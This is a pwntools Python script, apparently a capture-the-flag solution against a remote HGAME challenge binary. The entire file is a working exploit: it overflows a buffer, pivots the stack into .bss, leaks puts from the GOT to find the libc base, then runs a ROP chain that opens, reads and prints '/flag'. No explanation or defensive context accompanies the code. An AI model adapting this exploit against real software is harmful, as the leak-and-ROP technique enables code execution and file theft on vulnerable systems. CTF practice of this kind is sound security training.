from pwn import *

context(log_level='DEBUG', arch='amd64', os='linux')
context.terminal = "wt.exe nt bash -c".split()

sh = process(["./vuln"])
sh = remote("week-1.hgame.lwsec.cn", 31344)
elf = ELF("./vuln")
libc = ELF("./libc-2.31.so")

bss_addr = elf.bss()
vuln_addr = 0x4012CF
lea_ret_addr = 0x4012EE
fake_stack = bss_addr + 0x300
pop_rdi_ret_addr = 0x401393
puts_got = elf.got['puts']
puts_plt = elf.plt['puts']


sh.sendlineafter(b'before you try to solve this task.', b"\x00"*0x100 + p64(fake_stack) + p64(vuln_addr))
payload = p64(fake_stack-0x100) + p64(pop_rdi_ret_addr) + p64(puts_got) + p64(puts_plt) + p64(vuln_addr) + b'/flag\x00\x00'
payload += b'\x00'*(0x100-len(payload))
payload += p64(fake_stack-0x100) + p64(lea_ret_addr)
sh.sendline(payload)

sh.recvline()
recv = sh.recv(6)
print(recv)
libc_base = u64(recv.ljust(8, b'\x00')) - 0x84420
read_addr = libc_base + libc.sym['read']
open_addr = libc_base + libc.sym['open']
write_addr = libc_base + libc.sym['write']
pop_rsi_ret_addr = libc_base + 0x2601f
pop_rdx_ret_addr = libc_base + 0x142c92
print(hex(libc_base))

payload = p64(pop_rdi_ret_addr) + p64(fake_stack-0x100+0x28) + p64(pop_rsi_ret_addr) + p64(0) + p64(pop_rdx_ret_addr) + p64(0) + p64(open_addr)
payload += p64(pop_rdi_ret_addr) + p64(3) + p64(pop_rsi_ret_addr) + p64(fake_stack+0x40) + p64(pop_rdx_ret_addr) + p64(0x50) + p64(read_addr)
payload += p64(pop_rdi_ret_addr) + p64(1) + p64(pop_rsi_ret_addr) + p64(fake_stack+0x40) + p64(pop_rdx_ret_addr) + p64(0x50) + p64(write_addr)
payload += b'\x00'*(0x100-len(payload))
payload += p64(fake_stack-0x208) + p64(lea_ret_addr)
sh.sendline(payload)

sh.interactive()